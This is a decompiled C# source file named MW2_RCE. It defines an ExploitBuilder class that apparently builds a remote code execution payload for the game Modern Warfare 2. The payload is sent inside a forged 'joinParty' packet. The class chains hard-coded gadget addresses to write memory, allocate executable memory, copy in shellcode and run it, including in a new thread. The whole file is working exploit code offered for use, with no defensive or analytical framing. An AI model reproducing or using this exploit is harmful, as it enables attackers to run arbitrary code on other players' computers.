using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MW2_RCE
{
	// Token: 0x0200000E RID: 14
	internal class ExploitBuilder
	{
		// Token: 0x060000A6 RID: 166 RVA: 0x0000247C File Offset: 0x0000067C
		public ExploitBuilder()
		{
			this.buffer = new List<byte>();
			this.buffer.AddRange(ExploitBuilder.exploitHeader);
			this.startFix();
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00007890 File Offset: 0x00005A90
		public void addInt(int a)
		{
			string b = a.ToString();
			ASCIIEncoding enc = new ASCIIEncoding();
			this.buffer.AddRange(enc.GetBytes(b));
			this.buffer.Add(32);
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x000024A9 File Offset: 0x000006A9
		public void writeInt(int address, int data)
		{
			this.addInt(6773599);
			this.addInt(data);
			this.addInt(4269894);
			this.addInt(address);
			this.addInt(5854496);
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x000078D0 File Offset: 0x00005AD0
		public void writeData(int address, string data)
		{
			while (data.Length % 4 != 0)
			{
				data += " ";
			}
			for (int i = 0; i < data.Length; i += 4)
			{
				string lowString = data.Substring(i, 4);
				ASCIIEncoding encoder = new ASCIIEncoding();
				byte[] encodedString = encoder.GetBytes(lowString);
				int inaa = BitConverter.ToInt32(encodedString, 0);
				this.writeInt(address + i, inaa);
			}
			this.writeInt(address + data.Length, 0);
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00007958 File Offset: 0x00005B58
		public void pop(int numParams)
		{
			int[] popOffsets = new int[]
			{
				6758449,
				6758448,
				6758447,
				6758446,
				6758445,
				6758444,
				6758443
			};
			this.addInt(popOffsets[numParams]);
		}

		// Token: 0x060000AB RID: 171 RVA: 0x000024E0 File Offset: 0x000006E0
		public void startFix()
		{
			this.addInt(4273664);
			this.addInt(28882928);
			this.addInt(6706537);
			this.addInt(0);
			this.addInt(4198910);
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00007984 File Offset: 0x00005B84
		public byte[] finalize()
		{
			bool flag = this.finalized;
			bool flag2 = flag;
			byte[] result;
			if (flag2)
			{
				result = this.buffer.ToArray();
			}
			else
			{
				this.addInt(5677570);
				result = this.buffer.ToArray();
			}
			return result;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x000079D0 File Offset: 0x00005BD0
		public void executeShellcode(byte[] shellcode)
		{
			this.allocateMemory(105043864, shellcode.Length);
			this.writeDataInEax(shellcode.ToArray<byte>());
			this.addInt(4207009);
			this.addInt(105043864);
			this.addInt(4691259);
			this.addInt(4198411);
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00007A2C File Offset: 0x00005C2C
		public void executeShellcodeInNewThread(byte[] shellcode)
		{
			this.allocateMemory(105043864, shellcode.Length);
			this.writeDataInEax(shellcode.ToArray<byte>());
			this.addInt(4199159);
			this.addInt(6803920);
			this.addInt(5769048);
			this.addInt(0);
			this.addInt(6597074);
			this.addInt(4257472);
			this.addInt(6452288);
			this.addInt(4199159);
			this.addInt(105043864);
			this.addInt(5769048);
			this.addInt(4257472);
			this.addInt(5284421);
			this.addInt(5246274);
			this.addInt(5246274);
			this.addInt(5246274);
			this.addInt(5246274);
			this.addInt(4955533);
			this.pop(6);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
			this.addInt(0);
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00007B88 File Offset: 0x00005D88
		public void allocateMemory(int address, int size)
		{
			this.addInt(5994960);
			this.pop(4);
			this.addInt(0);
			this.addInt(size);
			this.addInt(12288);
			this.addInt(64);
			this.addInt(4199159);
			this.addInt(address);
			this.addInt(5850608);
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00007BF0 File Offset: 0x00005DF0
		public void writeDataInEax(byte[] data)
		{
			bool flag = data.Length % 4 != 0;
			bool flag2 = flag;
			if (flag2)
			{
				List<byte> dataList = data.ToList<byte>();
				while (dataList.Count % 4 != 0)
				{
					dataList.Add(0);
				}
				data = dataList.ToArray();
			}
			for (int i = 0; i < data.Length; i += 4)
			{
				this.addInt(4207009);
				byte[] encodedString = new byte[4];
				Array.Copy(data, i, encodedString, 0, 4);
				int inaa = BitConverter.ToInt32(encodedString, 0);
				this.addInt(inaa);
				this.addInt(4366425);
				this.addInt(6642441);
				this.addInt(4610212);
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x00007CAC File Offset: 0x00005EAC
		public void freeMemory(int address)
		{
			this.addInt(4207009);
			this.addInt(address);
			this.addInt(4691259);
			this.addInt(4207009);
			this.addInt(5994928);
			this.addInt(6536980);
			this.addInt(4198441);
			this.pop(1);
			this.addInt(0);
		}

		// Token: 0x04000048 RID: 72
		private const int UNUSED_DATA_POINTER = 105043897;

		// Token: 0x04000049 RID: 73
		private const int UNUSED_MEMORY_POINTER = 105043864;

		// Token: 0x0400004A RID: 74
		private static byte[] exploitHeader = new byte[]
		{
			byte.MaxValue,
			byte.MaxValue,
			byte.MaxValue,
			byte.MaxValue,
			49,
			106,
			111,
			105,
			110,
			80,
			97,
			114,
			116,
			121,
			32,
			49,
			52,
			57,
			32,
			49,
			32,
			49,
			32,
			48,
			32,
			48,
			32,
			48,
			32,
			53,
			48,
			48,
			32,
			48,
			32,
			48,
			32,
			49,
			32,
			50,
			32,
			51,
			32,
			52,
			32,
			53,
			32,
			54,
			32,
			55,
			32,
			56,
			32,
			57,
			32,
			49,
			48,
			32,
			49,
			49,
			32,
			49,
			50,
			32,
			49,
			51,
			32,
			49,
			52,
			32,
			49,
			53,
			32,
			49,
			54,
			32,
			49,
			55,
			32
		};

		// Token: 0x0400004B RID: 75
		private List<byte> buffer;

		// Token: 0x0400004C RID: 76
		private bool finalized;
	}
}
